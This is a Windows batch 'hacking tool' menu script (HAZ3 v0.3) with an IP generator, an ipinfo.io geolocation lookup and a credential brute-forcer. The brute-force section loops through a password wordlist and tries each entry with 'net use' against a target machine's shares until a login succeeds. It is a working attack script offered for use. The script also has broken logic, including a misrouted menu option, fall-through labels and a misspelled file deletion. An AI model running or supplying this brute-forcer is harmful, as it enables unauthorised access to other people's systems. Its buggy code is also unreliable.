@echo off
chcp 65001
color 5
title HAZ3 v0.3
:menu
cls

echo ======================================================
echo ‎ 
echo  ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
echo  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
echo  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░       ░▒▓█▓▒░ 
echo  ░▒▓████████▓▒░▒▓████████▓▒░  ░▒▓██▓▒░  ░▒▓███████▓▒░  
echo  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██▓▒░           ░▒▓█▓▒░ 
echo  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░ 
echo  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  
echo ‎  ‎ 
echo ======================================================                                                      
                                                      
                                             
echo  Welcome to HAZ3 v0.3 (made by mo)

echo ======================
echo 1) IP Gen
echo 2) IP Geo Lookup
echo 3) Bruteforce
echo 4) Back
echo 5) Close
echo ======================
set /p a=Enter your choice: 

if "%a%"=="" goto menu
if "%a%"=="6" goto ip_gen
if "%a%"=="2" goto ip_geo_lookup
if "%a%"=="3" goto bruteforce
if "%a%"=="4" goto menu
if "%a%"=="5" goto end

:ip_gen
cls
set "first="
set "second="
set "third="
set "fourth="

if "%~1" neq "" (
  set /a "first=%~1"
)

if "%~2" neq "" (
  set /a "second=%~2"
)

if "%~3" neq "" (
  set /a "third=%~3"
)

set /a fourth=%random%%%256

if not defined first set /a first=%random%%%256
if not defined second set /a second=%random%%%256
if not defined third set /a third=%random%%%256

echo ip: %first%.%second%.%third%.%fourth%

:ip_geo_lookup
cls
echo ==========================================================
echo ‎  ‎ 
echo  ███████╗███╗   ██╗████████╗███████╗██████╗     ██╗██████╗ 
echo  ██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗    ██║██╔══██╗
echo  █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝    ██║██████╔╝
echo  ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗    ██║██╔═══╝ 
echo  ███████╗██║ ╚████║   ██║   ███████╗██║  ██║    ██║██║     
echo  ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝╚═╝
echo ‎  ‎ 
echo ==========================================================
echo Enter An IP adress to lookup:
set /p ip=
if "%ip%"=="back" goto menu
if "%ip%"=="end" end

curl "https://ipinfo.io/%ip%/json" -o geolocation.json
echo ==================================
echo IP Geolocation for `%ip%:
type geolocation.json
del gelocation.json
echo =================================
pause
goto ip_geo_lookup

:bruteforce
cls
echo ====================================================================================
echo ‎  ‎ 
echo  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
echo  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
echo  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
echo  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
echo  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
echo  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
echo ‎  ‎ 
echo ====================================================================================
                                                                                 
set /p ip="Enter IP Adress: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

for /f %%a in (%wordlist%) do ( 
	set pass=%%a
	call :attempt
)
echo Password not found :(
pause
exit

:success
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% EQU 0 goto success


:end
